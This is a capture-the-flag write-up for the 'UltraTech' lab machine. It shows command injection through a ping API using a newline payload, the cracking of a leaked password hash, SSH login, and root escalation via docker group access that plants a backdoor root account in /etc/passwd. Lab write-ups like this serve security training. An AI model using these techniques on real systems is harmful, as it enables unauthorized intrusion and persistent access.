# UltraTech (Medium)

- The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

                                                           **~_. UltraTech ._~**

*This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.*

*If you get stuck at some point, take some time to keep enumerating.*

              **[ Your Mission ]**

You have been contracted by UltraTech to pentest their infrastructure.

It is a grey-box kind of assessment, the only information you have is the company's name and their server's IP address.

- We skip some basic steps enumurate and focus into the step research and exploit the machine.
- After scan all ports and enumurate directories, we have the port :31331 and port :8081 that we can use both.
- Let’s research all directories in port 31331 —> we have the /partners.html is the login page
- Port 8081 is the API of website UltraTech. They have two directories are /ping and /auth .
- /auth is the page link with the page login /partners.html so when we login the credentials, the page will transfer to → /auth to show the message “Invalid or login success”.
- We have the hint to find the database lying around so we need to find it to login the page.
- Now we can use to Burpsuite to intercept something.

![Untitled](Untitled.png)

- We can see when we open the page, the API will be automatic run with the Request query ping IP. We see the Response with ping successfully.

![Untitled](Untitled%201.png)

—> We have known the ping is always successful so we can manipulate the query ping IP to Inject command into query. Now we will `FUZZ` the inject command by Intruder.

- After researching the APIs, we know that we can inject command like ls, whoami, … with the command URL encoded.
- First we add $$ and command ls into the query.

![Untitled](Untitled%202.png)

- Secondly, we will load Payloads we will FUZZ. In here we will use the payload in `/usr/share/wordlists/wfuzz/Injections/All_attack.txt`  and Start attack.

![Untitled](Untitled%203.png)

- Waiting and check the Fuzz we will see the Payload “%0a” —> This is the newline URL encoded that is successful.

![Untitled](Untitled%204.png)

—> We have the database we need: utech.db.sqlite.

- Cat it to see information:

![Untitled](Untitled%205.png)

—> We have the credentials r00t:f357a0c52799563c7c7b76c1e7543a32 (password hashed) —> Dehash password —> r00t:n100906

- We use the credential we found to login SSH:

![Untitled](Untitled%206.png)

- We will privilege Root to get the SSH key private.
- And we use the tool `Linpeas.sh` scan the machine to find the vector priv and we have found the vector *docker .*
- First we try it with Docker shell in *GTFOBin:*

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
See 'docker run --help'.
```

—> It is not worked !!!

- We check the image of Docker:

```bash
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        5 years ago         15.8MB
```

—> We have one the docker image is “Bash” so we research to find other way with Docker.

- So We found it !!!

![Untitled](Untitled%207.png)

- We will  mount bash to create the new account in backdoor.
- Note: We need to cd /  firstly and after that we will mount bash.

![Untitled](Untitled%208.png)

```bash
r00t@ultratech-prod:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
r00t:x:1001:1001::/home/r00t:/bin/bash
www:x:1002:1002::/home/www:/bin/sh
toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh
```

—> Successful !!! and now `su toor` and get the private SSH key.

![Untitled](Untitled%209.png)

END!!!